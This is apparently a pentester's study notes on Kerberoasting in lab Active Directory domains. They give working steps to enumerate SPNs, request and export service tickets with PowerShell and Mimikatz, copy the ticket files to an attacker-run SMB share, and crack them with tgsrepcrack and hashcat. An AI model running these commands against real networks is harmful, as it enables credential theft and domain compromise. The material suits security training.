---
description: >-
  Kerberoasting Attack
title: Kerberoasting              # Add title here
date: 2022-12-08 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Authentication]          # Change Templates to Writeup
tags: [active directory, authentication, kerberoasting, tgs, spn]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Extracting SPNs from kali
parameter (-k) is used for Kerberos Authentication (NTLM is used by default):
```bash
# Example 1 (with Kerberos)
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
# Example 2 (with NTLM Auth)
impacket-GetUserSPNs htb.local/amanda:Ashare1972 -request
```
Examples:
[Scramble](https://shuciran.github.io/posts/Scramble/#fnref:kerberoasting-attack)
[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:kerberoasting)

[[Active#^659f81]]

> If we need to request a TGS against Kerberos, a modification on GetUserSPNs.py file is needed, further reading about this [issue](https://github.com/fortra/impacket/issues/1206) is needed to accomplish such authentication.
{: .prompt-tip }

### Extracting SPNs from compromised machine

Recalling the explanation of the Kerberos protocol, we know that when the user wants to access a resource hosted by a SPN, the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted through the password hash of the SPN.

When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.

We will abuse the service ticket and attempt to crack the password of the service account.

For example, we know that the registered SPN for the Internet Information Services web server in the domain is _HTTP/CorpWebServer.corp.com_. From PowerShell, we can use the _KerberosRequestorSecurityToken_ class to request the service ticket.

The code segment we need is located inside the _System.IdentityModel_ namespace, which is not loaded into a PowerShell instance by default. To load it, we use the _Add-Type_ cmdlet with the _-AssemblyName_ argument.

First download GetUserSNPS.ps1 from Internet:
[GetUserSPNs.ps1](https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1)

Execute the .ps1 with powershell, the output will be the Service Accounts:

```powershell
PS C:\Users\nathan> C:\Users\nathan\Desktop\GetUserSPNS.ps1

ServicePrincipalName : DC01/Allison.offsec.local:5999
Name                 : Allison
SAMAccountName       : Allison
MemberOf             : 
PasswordLastSet      : 2/22/2022 10:35:56 AM

ServicePrincipalName : kadmin/changepw
Name                 : krbtgt
SAMAccountName       : krbtgt
MemberOf             : CN=Denied RODC Password Replication 
                       Group,CN=Users,DC=offsec,DC=local
PasswordLastSet      : 2/4/2022 10:29:28 AM
```

We can call the _KerberosRequestorSecurityToken_ constructor by specifying the SPN with the _-ArgumentList_ option as shown below.

```powershell
PS C:\Users\nathan\Desktop> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\nathan\Desktop> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'DC01/Allison.offsec.local:5999'
```

After execution, the requested service ticket should be generated by the domain controller and loaded into the memory of the Windows 10 client. Instead of executing Mimikatz all the time, we can also use the built-in klist command to display all cached Kerberos tickets for the current user:

```
PS C:\Users\offsec.CORP> klist

Current LogonId is 0:0x3dedf

Cached Tickets: (4)

#0>	Client: Offsec @ CORP.COM
	Server: krbtgt/CORP.COM @ CORP.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicaliz
	Start Time: 2/12/2018 10:17:53 (local)
	End Time:   2/12/2018 20:17:53 (local)
	Renew Time: 2/19/2018 10:17:53 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: DC01.corp.com

#1>	Client: Offsec @ CORP.COM
	Server: HTTP/CorpWebServer.corp.com @ CORP.COM
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_cano
	Start Time: 2/12/2018 10:18:31 (local)
	End Time:   2/12/2018 20:17:53 (local)
	Renew Time: 2/19/2018 10:17:53 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0 
	Kdc Called: DC01.corp.com
...
```

With the service ticket for the Internet Information Services service principal name created and saved to memory, we can download it from memory using either built-in APIs or Mimikatz.

To download the service ticket with Mimikatz, we use the kerberos::list command, which yields the equivalent output of the klist command above. We also specify the /export flag to download to disk as shown below.

```
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 12/02/2018 10.17.53 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
   Server Name       : krbtgt/CORP.COM @ CORP.COM
   Client Name       : Offsec @ CORP.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forward
   \* Saved to file     : 0-40e10000-Offsec@krbtgt~CORP.COM-CORP.COM.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/02/2018 10.18.31 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
   Server Name       : HTTP/CorpWebServer.corp.com @ CORP.COM
   Client Name       : Offsec @ CORP.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
   \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

According to the Kerberos protocol, the service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing (in a technique known as _Kerberoasting_), we will know the password hash, and from that we can crack the clear text password of the service account. As an added bonus, we do _not_ need administrative privileges for this attack.

Let's try this out. To perform a wordlist attack, we must first install the _kerberoast_ package with apt and then run tgsrepcrack.py, supplying a wordlist and the downloaded service ticket:

Note that the service ticket file is binary. Keep this in mind when transferring it with a tool like Netcat, which may mangle it during transfer.

```
kali@kali:~$ sudo apt update && sudo apt install kerberoast
...
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi 
found password for ticket 0: Qwerty09!  File: 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
All tickets cracked!
```

Also it can be extracted with impacket-smbserver, converted to a hash that hashcat understands and then decrypted:

Kali:
```bash
impacket-smbserver shareFolder $(pwd) -smb2support
```

Victim-Machine:
```bash
copy *.kirbi \\192.168.119.248\shareFolder\*
```

Then convert the .kirbi files to hashes with kirbi2john:

```bash
kirbi2john *.kirbi > hash.txt
```

Finally extract the hashes from hash.txt and crack them with hashcat.exe (on your local machine if possible since hashcat works better if it has access to your GPU directly):
```cmd
D:\Programs\hashcat-6.2.5>hashcat.exe -m 13100 -a 0 hash.txt rockyou.txt
```

In this example we successfully cracked the service ticket and obtained the clear text password for the service account.

This technique can be very powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if managed or group managed service accounts are employed for the specific SPN, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible.

Although this example relied on the kerberoast tgsrepcrack.py script, we could also use John the Ripper[8](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-authentication/service-account-attacks#fn8) and Hashcat[9](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-authentication/service-account-attacks#fn9) to leverage the features and speed of those tools.

The [_Invoke-Kerberoast.ps1_](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.